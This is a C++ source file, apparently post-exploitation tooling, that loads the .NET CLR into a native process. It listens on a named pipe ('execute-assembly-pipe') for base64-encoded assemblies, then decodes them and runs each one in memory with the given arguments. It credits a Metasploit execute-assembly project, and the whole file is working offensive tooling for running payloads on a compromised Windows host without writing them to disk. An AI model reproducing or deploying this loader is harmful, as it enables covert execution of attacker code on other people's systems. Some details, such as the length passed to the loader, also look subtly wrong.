#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <mscoree.h>
#include <MetaHost.h>
#include <strsafe.h>
#include <string>
#include <iostream>
#include <fcntl.h>
#include <fstream>

//Make sure to add $(NETFXKitsDir)Include\um to your include directories
#import "mscorlib.tlb" raw_interfaces_only, auto_rename				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
#pragma comment(lib, "mscoree.lib")
using namespace mscorlib;

HRESULT hr;
ICLRMetaHost* pMetaHost = NULL;
ICLRRuntimeInfo* pRuntimeInfo = NULL;
BOOL bLoadable;
SAFEARRAY* psaArguments = NULL;
IUnknownPtr pUnk = NULL;
_AppDomainPtr pAppDomain = NULL;
_AssemblyPtr pAssembly = NULL;
_MethodInfo* pEntryPt = NULL;
SAFEARRAYBOUND bounds[1];
SAFEARRAY* psaBytes = NULL;
LONG rgIndices = 0;
wchar_t* w_ByteStr = NULL;
LPWSTR* szArglist = NULL;
int nArgs = 0;
VARIANT vReturnVal;
VARIANT vEmpty;
VARIANT vtPsa;

DWORD lpNumberOfBytesRead = 0;
DWORD dwFileSize = 0;
PVOID lpFileBuffer = NULL;

std::string bufString;

ICorRuntimeHost* g_Runtime = NULL;

HANDLE g_OrigninalStdOut = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdOut = INVALID_HANDLE_VALUE;
HANDLE g_OrigninalStdErr = INVALID_HANDLE_VALUE;
HANDLE g_CurrentStdErr = INVALID_HANDLE_VALUE;


//Signatures to check CLR version
char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };



//Functions to handle base64 conversation of assemblies
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];
	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;
			for (i = 0; (i < 4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}
	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';
		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;
		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];
		while ((i++ < 3))
			ret += '=';
	}
	return ret;
}
std::string base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;
	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);
			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}
	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;
		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);
		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}
	return ret;
}


//Find the CLR version that we want to load
BOOL FindVersion(void* assembly, int length)
{
	char* assembly_c;
	assembly_c = (char*)assembly;

	for (int i = 0; i < length; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (sig_40[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (9))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}

//Load our assembly into the AppDomain, process arguments, and execute it
int loadAndExecute(PVOID assembly, int assemblyLength, std::string args) {
	
	//Load the assembly
	//Establish the bounds for our safe array
	bounds[0].cElements = assemblyLength;
	bounds[0].lLbound = 0;

	//Create a safe array and fill it with the bytes of our .net assembly
	psaBytes = SafeArrayCreate(VT_UI1, 1, bounds);
	SafeArrayLock(psaBytes);
	memcpy(psaBytes->pvData, assembly, assemblyLength);
	SafeArrayUnlock(psaBytes);


	//Load the assembly into the app domain
	hr = pAppDomain->Load_3(psaBytes, &pAssembly);

	if (FAILED(hr))
	{
		printf("[!] pDefaultAppDomain->Load_3(...) failed, hr = %X", hr);
		

		return -1;
	}

	std::cout << "[+] pDefaultAppDomain->Load_3(...) succeeded" << std::endl;

	SafeArrayDestroy(psaBytes);

	if (FAILED(hr))
	{
		std::cout << "[!] SafeArrayUnaccessData(...) failed" << std::endl;

		

		return -1;
	}

	std::cout << "[+] SafeArrayUnaccessData(...) succeeded" << std::endl;

	// Find the entry point
	hr = pAssembly->get_EntryPoint(&pEntryPt);

	if (FAILED(hr))
	{
		std::cout << "[!] pAssembly->get_EntryPoint(...) failed" << std::endl;

		

		return -1;
	}

	std::cout << "[+] pAssembly->get_EntryPoint(...) succeeded" << std::endl;

	SecureZeroMemory(&vReturnVal, sizeof(VARIANT));
	SecureZeroMemory(&vEmpty, sizeof(VARIANT));
	SecureZeroMemory(&vtPsa, sizeof(VARIANT));
	
	vEmpty.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	//This will take our arguments and format them so they look like command line arguments to main (otherwise they are treated as a single string)
	//Credit to https://github.com/b4rtik/metasploit-execute-assembly/blob/master/HostingCLR_inject/HostingCLR/HostingCLR.cpp for getting this to work properly
	if (args.empty())
	{

		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 0);

	}
	else
	{
		//Convert to wide characters
		w_ByteStr = (wchar_t*)malloc((sizeof(wchar_t) * args.size() + 1));
		mbstowcs(w_ByteStr, (char*)args.data(), args.size() + 1);
		szArglist = CommandLineToArgvW(w_ByteStr, &nArgs);


		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
		for (long i = 0; i < nArgs; i++)
		{
			BSTR strParam1 = SysAllocString(szArglist[i]);
			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
		}
	}

	psaArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

	hr = SafeArrayPutElement(psaArguments, &rgIndices, &vtPsa);

	//Execute the function.  Note that if you are executing a function with return data it will end up in vReturnVal
	hr = pEntryPt->Invoke_3(vEmpty, psaArguments, &vReturnVal);

	if (FAILED(hr))
	{
		std::cout << "[!] pMethodInfo->Invoke_3(...) failed" << std::endl;
		return -1;
	}

	std::cout << "[+] pMethodInfo->Invoke_3(...) succeeded" << std::endl;
	//std::cout << "%s\n", vReturnVal;
	
	return 0;
}

//Load the CLR, we only call this once initially
int loadCLR()
{
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);

	if (FAILED(hr))
	{
		std::cout << "[!] CLRCreateInstance(...) failed" << std::endl;
		return -1;
	}

	std::cout << "[+] CLRCreateInstance(...) succeeded" << std::endl;

	LPCWSTR clrVersion;

	if (FindVersion(lpFileBuffer, lpNumberOfBytesRead))
	{
		clrVersion = L"v4.0.30319";
	}
	else
	{
		clrVersion = L"v2.0.50727";
	}

	//DotNet version v4.0.30319
	hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
	if (FAILED(hr))
	{
		std::cout << "[!] pMetaHost->GetRuntime(...) failed" << std::endl;
		return -1;
	}

	std::cout << "[+] pMetaHost->GetRuntime(...) succeeded" << std::endl;

	// Check if the runtime is loadable (this will fail without .Net v4.x on the system)

	hr = pRuntimeInfo->IsLoadable(&bLoadable);
	if (FAILED(hr) || !bLoadable)
	{
		std::cout << "[!] pRuntimeInfo->IsLoadable(...) failed" << std::endl;

		return -1;
	}

	std::cout << "[+] pRuntimeInfo->IsLoadable(...) succeeded" << std::endl;


	// Load the CLR into the current process
	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&g_Runtime);
	if (FAILED(hr))
	{
		std::cout << "[!] pRuntimeInfo->GetInterface(...) failed" << std::endl;

		return -1;
	}

	std::cout << "[+] pRuntimeInfo->GetInterface(...) succeeded" << std::endl;

	// Start the CLR.
	hr = g_Runtime->Start();
	if (FAILED(hr))
	{
		std::cout << "[!] pRuntimeHost->Start() failed" << std::endl;

		return -1;
	}

	std::cout << "[+] pRuntimeHost->Start() succeeded" << std::endl;

	//Get a pointer to the IUnknown interface because....COM
	hr = g_Runtime->GetDefaultDomain(&pUnk);
	if (FAILED(hr))
	{
		std::cout << "[!] pRuntimeHost->GetDefaultDomain(...) failed" << std::endl;

		return -1;
	}

	std::cout << "[+] pRuntimeHost->GetDefaultDomain(...) succeeded" << std::endl;

	// Get the current app domain
	hr = pUnk->QueryInterface(IID_PPV_ARGS(&pAppDomain));
	if (FAILED(hr))
	{
		std::cout << "[!] pAppDomainThunk->QueryInterface(...) failed" << std::endl;

		return -1;
	}

	std::cout << "[+] pAppDomainThunk->QueryInterface(...) succeeded" << std::endl;
}

//Use this to load assemblies from disk. Not used currently, leaving for future expansion
int getAssemblyContents(std::string assemblyName)
{
	HANDLE hFile = CreateFileA(assemblyName.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "[!] Invalid file handle" << std::endl;
		return 1;
	}

	dwFileSize = GetFileSize(hFile, NULL);
	lpFileBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, lpFileBuffer, dwFileSize, &lpNumberOfBytesRead, NULL))
	{
		std::cout << "[!] Failed to read file" << std::endl;
		return 1;
	}

	CloseHandle(hFile);
}

int main() {
	
	HANDLE hPipe;
	//These variables are the upper bound on the assembly size. Note that the static keyword allocates these on the heap, as we get a stack overflow otherwise
	static char buffer[1500000];
	static char base64DecodedProgram[1500000];
	DWORD dwRead;

	std::string args = "";

	//Load the CLR
	loadCLR();
	std::cout << "[+] CLR loaded!" << std::endl;
	
	//Connect to our named pipe
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\execute-assembly-pipe"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
		1,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	if (hPipe == INVALID_HANDLE_VALUE) {
		std::cout << "[-] Failed to connect to named pipe." << std::endl;
	}

	//Start our main loop
	while (true) {
		
		while (hPipe != INVALID_HANDLE_VALUE)
		{
			if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
			{
				std::cout << "[+] Named pipe connected" << std::endl;
				while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE) //read from named pipe
				{
					std::cout << "[+] Executing program!" << std::endl;
					
					//Easier to work with string operations here
					bufString = buffer;
					if (strcmp(buffer, "exit") == 0)
					{
						return 0;
					}
					std::string delimiter = " ";
					std::string base64Program = bufString.substr(0, bufString.find(delimiter));
					//Decode the assembly and place it into the buffer
					memcpy(base64DecodedProgram, base64_decode(base64Program).c_str(), base64_decode(base64Program).size());
					
					std::string arguments = "";
					//if we we have arguments after the assembly then grab them
					if (bufString.find(delimiter) != std::string::npos)
					{
						arguments = bufString.substr(bufString.find(delimiter) + 1, bufString.size());
					}
					//if our arguments are blank then make them actually blank
					if (arguments == " ")
					{
						arguments = "";
					}
					//Load and execute
					loadAndExecute(base64DecodedProgram, base64Program.size(), arguments);
					//Reset our buffer, otherwise it will fail if the next message is shorter
					memset(buffer, '\0', sizeof(buffer));
				}
			}

			DisconnectNamedPipe(hPipe);
		}
	}
}

